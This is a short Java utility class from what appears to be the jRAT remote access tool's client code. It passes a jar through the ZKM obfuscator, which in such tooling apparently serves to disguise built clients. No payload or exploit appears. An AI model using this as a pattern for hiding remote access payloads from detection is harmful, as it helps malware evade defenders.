package pro.jrat.client.utils;

import java.io.File;
import java.util.jar.JarFile;

import pro.jrat.api.utils.JarUtils;

import com.redpois0n.zkmlib.Main;
import com.redpois0n.zkmlib.Obfuscator;

public class ZkmUtils {
	
	public static void obfuscate(File input, File output) throws Exception {
		Main.zkmJar = new File("files/zkm/ZKM.jar");
		Obfuscator obfuscator = new Obfuscator(input, output, JarUtils.getMainClass(new JarFile(input)));
		obfuscator.obfuscate();
	}

}
